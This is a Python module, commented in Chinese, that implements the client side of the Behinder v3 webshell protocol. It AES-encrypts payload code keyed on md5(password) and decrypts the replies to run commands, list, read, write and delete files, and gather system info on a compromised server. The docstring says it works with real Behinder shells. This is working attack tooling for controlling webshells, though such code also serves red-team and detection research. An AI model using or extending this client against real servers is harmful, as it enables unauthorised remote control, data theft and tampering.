"""冰蝎 Behinder v3 协议编解码。

线格式：
  请求体 = base64( AES-128-ECB( 载荷源码 ) )，密钥 = md5(密码)[:16]
  响应体 = base64( AES-128-ECB( 载荷输出 ) )（由载荷自行加密，v3 约定）
shell 侧只需 openssl_decrypt(请求体) 后 eval，即可对接真实冰蝎马。
"""

from __future__ import annotations

import base64
import hashlib
import json

try:  # 作为包导入时
    from ..crypto import aes_ecb_decrypt, aes_ecb_encrypt
except ImportError:  # 引擎以脚本方式运行时（webshell 目录在 sys.path 上）
    from crypto import aes_ecb_decrypt, aes_ecb_encrypt

from .base import Operation, Protocol, ProtocolError
from .templates import behinder as behinder_templates


def derive_key(password: str) -> bytes:
    """冰蝎 v3 密钥：md5(密码) 的前 16 个十六进制字符（作为 ASCII 字节）。"""
    return hashlib.md5(password.encode("utf-8")).hexdigest()[:16].encode("ascii")


class BehinderProtocol(Protocol):
    name = "behinder"
    languages = behinder_templates.supported()  # 随各阶段扩展
    encoders = ()  # 固定 AES，无编码器

    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.key = derive_key(self.password)
        self.key_str = self.key.decode("ascii")

    def build_request(self, operation: str, params: dict) -> tuple[bytes, dict[str, str]]:
        source = behinder_templates.render(self.payload_type, operation, params, self.key_str)
        cipher = aes_ecb_encrypt(self.key, source.encode("utf-8"))
        body = base64.b64encode(cipher)
        return body, {"Content-Type": "application/octet-stream"}

    def parse_response(self, operation: str, raw: bytes) -> dict:
        text = raw.strip()
        if not text:
            raise ProtocolError("响应为空，可能密钥错误或不是有效的冰蝎 shell")
        try:
            cipher = base64.b64decode(text)
            plain = aes_ecb_decrypt(self.key, cipher).decode("utf-8", errors="replace")
        except Exception as error:  # noqa: BLE001 解密失败统一归为协议错误
            raise ProtocolError(f"响应解密失败（密钥不匹配？）：{error}") from error
        return _interpret(operation, plain)


def _interpret(operation: str, plain: str) -> dict:
    if operation == Operation.SYSINFO:
        try:
            info = json.loads(plain)
        except json.JSONDecodeError:
            info = {"raw": plain}
        return info if isinstance(info, dict) else {"raw": plain}
    if operation == Operation.EXEC:
        return {"output": plain}
    if operation == Operation.LIST:
        return Protocol.normalize_listing(plain)
    if operation == Operation.READ:
        return {"content": plain.strip()}
    if operation == Operation.WRITE:
        try:
            written = int(plain.strip())
        except ValueError:
            written = -1
        return {"written": written}
    if operation == Operation.DELETE:
        return {"deleted": plain.strip() == "1"}
    raise ProtocolError(f"冰蝎无法解释操作：{operation}")
